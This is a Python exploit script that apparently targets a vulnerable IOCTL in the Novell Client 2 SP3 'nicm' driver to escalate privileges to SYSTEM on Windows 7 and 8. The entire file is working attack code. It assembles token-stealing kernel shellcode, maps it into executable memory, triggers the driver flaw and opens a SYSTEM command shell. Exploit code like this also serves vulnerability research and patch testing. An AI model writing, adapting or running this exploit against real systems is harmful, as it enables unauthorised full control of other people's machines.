 
from ctypes import *
import sys,struct,os
from optparse import OptionParser
 
kernel32 = windll.kernel32
ntdll    = windll.ntdll
 
if __name__ == '__main__':
 
     usage =  "%prog -o <target>"
     parser = OptionParser(usage=usage)
     parser.add_option("-o", type="string",
                  action="store", dest="target_os",
                  help="Available target operating systems: WIN7, WIN8")
     (options, args) = parser.parse_args()
     OS = options.target_os
     if not OS or OS.upper() not in ['WIN7','WIN8']:
           parser.print_help()
           sys.exit()
     OS = OS.upper()
 
     if OS == "WIN7":
        _KPROCESS = "\x50" # Offset for Win7
        _TOKEN    = "\xf8" # Offset for Win7
        _UPID     = "\xb4" # Offset for Win7
        _APLINKS  = "\xb8" # Offset for Win7
         
        steal_token =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x89\x1d\x00\x09\x02\x00"             +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5b"                                 +\
                 "\x5a"                                 +\
                 "\xc2\x08"
 
        sc = steal_token   
         
     else:
        _KPROCESS = "\x80" # Offset for Win8
        _TOKEN    = "\xEC" # Offset for Win8
        _UPID     = "\xB4" # Offset for Win8
        _APLINKS  = "\xB8" # Offset for Win8
 
        steal_token =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x80" + _KPROCESS + "\x00\x00\x00"+\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x5b"                                 +\
                 "\x5a"                                 +\
                 "\xc2\x08"
 
        sc = steal_token
 
     
     kernel_sc = "\x14\x00\x0d\x0d"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x18\x00\x0d\x0d"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x41\x41\x41\x41"
     kernel_sc+= "\x28\x00\x0d\x0d"
     kernel_sc+= sc
     
     
     print "[>] Novell Client 2 SP3 privilege escalation for Windows 7 and Windows 8."
     print "[>] Finding the driver."
     
     GENERIC_READ = 0x80000000
     GENERIC_WRITE = 0x40000000
     OPEN_EXISTING = 0x3
     DEVICE = '\\\\.\\nicm'
     
     device_handler = kernel32.CreateFileA(DEVICE, GENERIC_READ|GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
     EVIL_IOCTL = 0x00143B6B # Vulnerable IOCTL
     retn = c_ulong()
     
     inut_buffer = 0x0d0d0000
     inut_size = 0x14
     output_buffer = 0x0
     output_size = 0x0
 
     baseadd    = c_int(0x0d0d0000)
         
     MEMRES     = (0x1000 | 0x2000)
     PAGEEXE    = 0x00000040
     Zero_Bits   = c_int(0)
     RegionSize = c_int(0x1000)
     write    = c_int(0)
 
     print "[>] Allocating memory for our shellcode."
     dwStatus = ntdll.NtAllocateVirtualMemory(-1, byref(baseadd), 0x0, byref(RegionSize), MEMRES, PAGEEXE)
     print "[>] Writing the shellcode."
     kernel32.WriteProcessMemory(-1, 0x0d0d0000, kernel_sc, 0x1000, byref(write))
 
     if device_handler:
        print "[>] Sending IOCTL to the driver."
        dev_io = kernel32.DeviceIoControl(device_handler, EVIL_IOCTL, inut_buffer, inut_size, output_buffer, output_size, byref(retn), None)
 
     print "[>] Dropping to a SYSTEM shell."
     os.system("cmd.exe /K cd C:\\windows\\system32")

